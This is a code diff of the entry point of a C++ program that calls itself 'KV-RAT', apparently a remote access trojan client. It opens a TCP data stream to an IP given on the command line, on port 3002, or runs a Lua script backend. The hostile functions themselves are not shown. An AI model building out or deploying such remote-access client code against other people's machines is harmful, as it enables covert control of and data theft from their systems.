@@ -1,42 +1,50 @@
 #include <iostream>
-#define ASIO_STANDALONE
-#include "networking.h"
+#include "Networking/Networking.h"
 #include "Commands/Commands.h"
 #include "Commands/CommandHandler.h"
-#include "onload.h"
+#include <../../external/SDL2/SDL.h>
+#include <../../external/SDL2/SDL_image.h>
+#include <../../external/SDL2/SDL_mixer.h>
+#include "Commands/LuaBackend.h"
+#include <cstring>
 #include <thread>
 
 int main(int argc, char** argv)
 {
     if (argc < 2)
     {
-        std::cerr << "Usage: " << argv[0] << " [server|client] [IP]\n";
+        std::cerr << "Usage: " << argv[0] << " [IP]\n";
         return 1;
     }
 
-    int do_init = onload();
-
-    if (do_init == 2)
-        exit(0);
-
-    std::string mode = argv[1];
-    if (mode == "client")
+    int result = MessageBoxW(nullptr, L"KV-RAT has started, but nothing has initalized.\nContinue?", L"KV-RAT", MB_OKCANCEL | MB_ICONEXCLAMATION);
+    if (result == 2)
     {
-        network::client(argv[2]);
+        return 0;
     }
-    else if (mode == "server")
+
+    if(strcmp(argv[1], "-l") == 0)
     {
-        network::server();
-    }
-    else if (mode == "SDL_Test")
-    {
-        commands::cringe();
+        LuaBackend lb("script.lua");
     }
     else
     {
-        std::cerr << "Invalid mode. Check usage\n";
-        return 1;
-    }
+        Network client(argv[1], 3002);
+        //client.start();
+        client.tcp_datastream();
 
+        /*
+        std::thread LuaThread([]() {
+            LuaBackend lb("script.lua");
+        });
+
+        std::thread ClientThread([=]() {
+            Network client(argv[1], 3002);
+            client.start();
+            client.udp_datastream();
+        });
+        */
+    }
+    
     return 0;
 }
